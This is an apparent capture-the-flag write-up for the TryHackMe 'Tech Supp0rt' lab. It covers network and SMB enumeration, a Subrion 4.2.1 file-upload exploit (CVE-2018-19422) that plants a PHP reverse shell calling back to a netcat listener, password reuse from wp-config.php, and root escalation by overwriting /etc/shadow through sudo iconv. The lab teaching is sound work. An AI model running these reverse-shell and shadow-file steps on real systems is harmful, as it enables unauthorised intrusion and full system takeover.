<p align="center">
  THM : Tech Supp0rt<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/techsupp0rt1<br>
  <img src="https://i.imgur.com/3nnIqYV.jpg">
<p/>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [SMB enumeration](#smb-enumeration)
- [Exploiting Subrion 4.2.1](#exploiting-subrion-421)
- [Privilege escalation (scamsite)](#privilege-escalation-scamsite)
- [Privilege escalation (root)](#privilege-escalation-root)
- [Conclusion](#conclusion)

## Nmap scan 

Fist, let's use nmap to start an agressive scan against the target :  
```
attacker@AttackBox:~/Tech_Supp0rt$ nmap 10.10.182.244 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-29 02:23 CET
Nmap scan report for 10.10.182.244
Host is up (0.048s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-01-29T06:54:06+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-29T01:24:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.48 seconds
```

## Website enumeration

Let's enumerate the website. First, we will use [gobuster](https://github.com/OJ/gobuster) to try to find useful directories or files :  
```
attacker@AttackBox:~/Tech_Supp0rt$ gobuster dir -u http://10.10.182.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults-txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.182.244/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/29 02:42:28 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.182.244/wordpress/]
/test                 (Status: 301) [Size: 313] [--> http://10.10.182.244/test/]
/server-status        (Status: 403) [Size: 278]
Progress: 220487 / 220561 (99.97%)
===============================================================
2023/01/29 02:54:42 Finished
===============================================================
```

Nothing interesting on `/test` or `/wordpress` (we don't have any credentials).


## SMB enumeration

Let's use  [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) to enumerate smb shares and users :  
```
attacker@AttackBox:~/Tech_Supp0rt$ enum4linux 10.10.182.244
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 29 02:30:33 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.182.244
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 10.10.182.244 )===========================

[E] Can't find workgroup/domain

 ===============================( Nbtstat Information for 10.10.182.244 )===============================

Looking up status of 10.10.182.244
No reply from 10.10.182.244

 ===================================( Session Check on 10.10.182.244 )===================================

[+] Server 10.10.182.244 allows sessions using username '', password ''

 ================================( Getting domain SID for 10.10.182.244 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

 ==================================( OS information on 10.10.182.244 )==================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.182.244 from srvinfo: 
	TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =======================================( Users on 10.10.182.244 )=======================================

[E] No response using rpcclient querydispinfo

[E] No response using rpcclient enumdomusers

 =================================( Share Enumeration on 10.10.182.244 )=================================

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.182.244

//10.10.182.244/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.182.244/websvr	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.182.244/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.182.244 )===========================

[+] Attaching to 10.10.182.244 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] TECHSUPPORT
	[+] Builtin

[+] Password Info for Domain: TECHSUPPORT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 ======================================( Groups on 10.10.182.244 )======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ==================( Users on 10.10.182.244 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''

S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\scamsite (Local User)

 ===============================( Getting printer info for 10.10.182.244 )===============================

No printers returned.

enum4linux complete on Sun Jan 29 02:33:17 2023
```

We have found `scamsite` user, and a share named `websvr`. Let's enumerate what's inside `websvr` share :  
```
attacker@AttackBox:~/Tech_Supp0rt$ smbclient //10.10.182.244/websvr
Enter WORKGROUP\attacker's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 09:17:38 2021
  ..                                  D        0  Sat May 29 09:03:47 2021
  enter.txt                           N      273  Sat May 29 09:17:38 2021

		8460484 blocks of size 1024. 5650476 blocks available
smb: \>
```

Let's see what's inside this txt file :  
```
smb: \> get enter.txt 
getting file \enter.txt of size 273 as enter.txt (2,0 KiloBytes/sec) (average 2,0 KiloBytes/sec)
smb: \> exit
attacker@AttackBox:~/Tech_Supp0rt$ cat enter.txt 
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

Subrion (it's a CMS) is not working... But there is a way to access it. 

## Exploiting Subrion 4.2.1

By searching on google, you can find that subrion has a panel at `/panel`. If we try to go manually to this panel by typing `http://[TARGET_IP]/subrion/panel/`, we have access to the 
login page of the CMS :  
![](https://i.imgur.com/hF3BTsJ.jpg)  

Now, we need credentials. We found the username and the password but it is encoded. Let's try to decode it using [CyberChef](https://gchq.github.io/CyberChef/) :  
![](https://i.imgur.com/7LSXVES.jpg)  

We can click on the magic stick to let CyberChef decode it automatically :  
![](https://i.imgur.com/BXGL1rC.jpg)  

Now, we can try to login using the username `admin` and the password we decoded :  
![](https://i.imgur.com/DlCId7f.jpg)  

And we are logged in ! Now, we have to get a shell. The installed version of Subrion is 4.2.1. This version is vulnerable to [CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422). 
We can upload a `.phar` file containing a php reverse shell (I use [this](https://github.com/pentestmonkey/php-reverse-shell) one from pentest monkey). So let's do this. We can go to `Content -> Uploads`:  
![](https://i.imgur.com/ZlQaKvN.jpg)  

Then we can click the `Upload files` button (the one that has a floppy disk icon) to upload a php reverse shell with the `.phar` extension :  
![](https://i.imgur.com/peKPnvB.jpg)  

Now, we can start a netcat listener on our machine :  
```
attacker@AttackBox:~/Tech_Supp0rt$ nc -lnvp 4242
listening on [any] 4242 ...
```

And then navigate to `http://[TARGET_IP]/subrion/uploads/[php_file_name]` so for me it's `http://10.10.158.200/subrion/uploads/php-reverse-shell.phar`. After this, we can go back to our netcat 
listener :  
```
attacker@AttackBox:~/Tech_Supp0rt$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.158.200] 58216
Linux TechSupport 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:42:23 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

We have a shell as `www-data`. Now, let's stabilize it :  
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@TechSupport:/var/www/html/wordpress$ export TERM=xterm
export TERM=xterm
```

After this, we can press `CTRL+Z` to background the reverse shell, and then type `stty -echo raw;fg`. Now our shell is fully stabilized.

## Privilege escalation (scamsite)

Now, it's time to escalate our privileges. Remember, there is a `scamsite` user we found using [enum4linux](https://github.com/CiscoCXSecurity/enum4linux). Also, there is a `wordpress` 
directory on the host. Let's see if we can find something useful in `/var/www/html/wordpress/wp-config.php` :  
```
www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', '*************' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

We have the password for the database. Maybe the local password for `scamsite` user is the same password for the database. Let's try :  
```
www-data@TechSupport:/var/www/html/wordpress$ su scamsite
Password: 
scamsite@TechSupport:/var/www/html/wordpress$
```

It is ! Now, time to get root.

## Privilege escalation (root)

Let's see if we have any sudo rights :  
```
scamsite@TechSupport:/var/www/html/wordpress$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

We can use `ìconv` as root without password. Let's search for `iconv` on [GTFOBins](https://gtfobins.github.io/) :  
![](https://i.imgur.com/4vx8I7k.jpg)  

We can read or write files with `root` permissions. So we can read `/etc/shadow` and save the output to `shadow` like this :  
```
scamsite@TechSupport:~$ rm shadow 
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/etc/shadow" > shadow
```

Now, let's generate a hash on our local machine :  
```
attacker@AttackBox:~/Tech_Supp0rt$ mkpasswd --method=SHA-512 --stdin
Mot de passe : test
$6$1qGfogPTajX5Qxxg$/zlvLhLo3Oi619BJljqiFFl87M751r.eQboaBrePIwhmZcaIkuHVp.K04zgVT433WU14FdvPK2tUX72t0jEjT/
```

We can edit the file to replace the hash for `root` with a hash we have generated on the target host :  
```
scamsite@TechSupport:~$ nano shadow 
scamsite@TechSupport:~$ cat shadow 
root:$6$1qGfogPTajX5Qxxg$/zlvLhLo3Oi619BJljqiFFl87M751r.eQboaBrePIwhmZcaIkuHVp.K04zgVT433WU14FdvPK2tUX72t0jEjT/:18775:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18775:0:99999:7:::
messagebus:*:18775:0:99999:7:::
uuidd:*:18775:0:99999:7:::
dnsmasq:*:18775:0:99999:7:::
sshd:*:18775:0:99999:7:::
scamsite:$6$TCBCdrjH$OmTcHNrjHbDc54pJOfTFNhQE2bzcSRkHKO61aFSKkQySm5xOUVZsjVrx7QHh2uT4ozDv9FNkemtw6XFiBJ3Ma1:18775:0:99999:7:::
mysql:!:18775:0:99999:7:::
```

Then, we can replace `/etc/shadow` by the file we just edited :  
```
scamsite@TechSupport:~$ cat shadow | sudo iconv -f 8859_1 -t 8859_1 -o "/etc/shadow"
scamsite@TechSupport:~$
```

Finally, let's try to login as `root` using the password we used to generate the hash :  
```
scamsite@TechSupport:~$ su root
Password: 
root@TechSupport:/home/scamsite#
```

We are `root` ! Let's get the root flag :  
```
root@TechSupport:/home/scamsite# cd /root
root@TechSupport:~# ls
root.txt
root@TechSupport:~# cat root.txt
********************************  -
root@TechSupport:~#
```

## Conclusion

In this room, we practiced :  
- Services and open ports enumeration using [nmap](https://nmap.org/book/man.html)
- Website enumeration using [gobuster]()
- Manual website enumeration
- SMB enumeration
- Subrion 4.2.1 exploiting ([CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422))
- Basic linux privilege escalation

Thanks for this room and thanks for reading my write ups !
